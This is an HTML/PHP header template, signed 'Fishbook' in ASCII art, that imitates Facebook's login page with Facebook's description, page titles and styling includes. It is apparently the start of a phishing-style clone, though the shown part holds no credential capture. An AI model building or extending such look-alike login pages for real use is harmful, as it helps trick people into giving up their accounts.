<!doctype html>
<!-- 
 Julien Roy's
 _______ _      _     _                 _     
(_______|_)    | |   | |               | |    
 _____   _  ___| | _ | | _   ___   ___ | |  _ 
|  ___) | |/__ ) || \| || \ / _ \ / _ \| | / )
| |     | |___ | | | | |_) ) |0| | |0| | |< ( 
|_|     |_(___/|_| |_|____/ \___/ \___/|_| \_)
								 ||
							  \      /
							  	----
								 --
-->
<html lang="en" id="Facebook" class="no_js">
<head>
    <meta charset="utf-8" />
    <meta name="robots" content="noodp, noydir" />
    <meta name="referrer" content="default" id="meta_referrer" />
	<meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." />
    <?php
		if($_SESSION['logged_in']) {
			echo "<title id='pageTitle'>Facebook</title>\n";
		} else {
			echo "<title id='pageTitle'>Welcome to Facebook - Log In, Sign Up or Learn More</title>\n";
		}
	?>
    <?php
		echo "<!-- CSS -->\n";
		echo "<style>\n";
			require_once "templates/css/reset.min.css";
			require_once "templates/css/main.min.css";
		echo "</style>\n";
		echo "<!--[if IE]><link rel=\"stylesheet\" href=\"templates/css/ie.min.css\" /><![endif]-->\n";
		echo "<!-- Icons -->\n";
		echo "<link rel=\"shortcut icon\" href=\"templates/img/favicon.ico\">\n";
		echo "<!-- JS -->\n";
		echo "<script>\n";
			require_once "templates/js/vendor/modernizr.js";
		echo "</script>\n";
	?>
	<!--<link rel='stylesheet' href='templates/css/main.css' />-->
</head>
<body id="home">